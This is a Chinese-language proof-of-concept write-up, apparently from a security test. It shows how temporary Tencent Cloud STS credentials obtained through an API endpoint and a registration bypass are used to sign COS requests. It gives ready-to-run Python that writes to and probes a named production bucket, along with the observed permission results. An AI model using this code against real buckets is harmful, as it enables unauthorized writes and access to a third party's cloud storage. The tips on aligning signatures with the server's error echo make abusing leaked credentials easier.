## 用途
API 侧 /api/qcloud_sts（需任意登录态，配合「未授权注册绕过」即可获得）会下发腾讯云 STS 临时凭证（TmpSecretId/TmpSecretKey/Token + bucket + region + filename）。本条 POC 给出**不装 SDK**直接用 python 签名使用该凭证的方法（COS v5 q-signature，HMAC-SHA1），用于枚举/读写/验证权限边界。

## 关键点（踩坑记录）
1. HttpString = method\nuri\nquery\nheaders\n —— 其中 headers 必须用 `key=value&key=value` 形式以 `&` 连接（**不是换行**），且 key 全小写、value 需 urlencode；query 需按 key 排序。
2. 使用临时凭证时，`x-cos-security-token` **必须列入签名头并随请求发送**。
3. SignKey = HMAC-SHA1(SecretKey, "start;end")（keytime 为 `起始;结束` 秒级时间戳字符串），Signature = HMAC-SHA1(SignKey, "sha1\n<keytime>\n<sha1(HttpString)>\n")。
4. 403 SignatureDoesNotMatch 会直接在响应里回显服务器算出的 StringToSign 与 FormatString，可据此逐字对齐（本次即靠它定位到 headers 连接符错误）。

## 代码（可直接跑）
```python
import hmac, hashlib, time, urllib.parse, requests
AK, SK, TOKEN = "<TmpSecretId>", "<TmpSecretKey>", "<Token>"
BUCKET, REGION = "liveprod-1324619173", "ap-guangzhou"

def _sha1(s): return hashlib.sha1(s.encode()).hexdigest()
def _hmac1(k, m): return hmac.new(k.encode(), m.encode(), hashlib.sha1).hexdigest()

def cos_signed(method, uri, params=None, body=None, host=None):
    params = params or {}
    host = host or "%s.cos.%s.myqcloud.com" % (BUCKET, REGION)
    now = int(time.time()); kt = "%d;%d" % (now - 60, now + 3600)
    hdrs = {"Host": host, "x-cos-security-token": TOKEN}
    qs = "&".join("%s=%s" % (k, urllib.parse.quote(str(params[k]), safe="")) for k in sorted(params))
    hs = "&".join("%s=%s" % (k.lower(), urllib.parse.quote(str(hdrs[k]), safe="")) for k in sorted(hdrs))
    http_string = "%s\n%s\n%s\n%s\n" % (method.lower(), uri, qs, hs)
    sig = _hmac1(_hmac1(SK, kt), "sha1\n%s\n%s\n" % (kt, _sha1(http_string)))
    auth = ("q-sign-algorithm=sha1&q-ak=%s&q-sign-time=%s&q-key-time=%s&q-header-list=%s"
            "&q-url-param-list=%s&q-signature=%s" % (AK, kt, kt, ";".join(sorted(k.lower() for k in hdrs)),
                                                    ";".join(sorted(params)), sig))
    url = "https://%s%s%s" % (host, uri, ("?" + qs) if qs else "")
    return requests.request(method, url, headers={"Host": host, "x-cos-security-token": TOKEN,
                           "Authorization": auth}, data=body, timeout=30, verify=False)

# 写入（策略允许 images/* ）
print(cos_signed("PUT", "/images/proof.txt", body=b"hello").status_code)   # 200
# 边界判定
print(cos_signed("PUT", "/proof.txt", body=b"x").status_code)              # 403
print(cos_signed("GET", "/", {"list-type": "2"}).status_code)              # 403
```

## 本次实测策略边界
`cos:PutObject` 限定 `liveprod-1324619173/images/*`：写入 200；匿名读 200（源站域与 cos.accelerate CDN 域均可）；GetObject/GetBucket/ListBuckets/根路径写 403；跨桶 451（账号欠费）或 404（桶不存在）。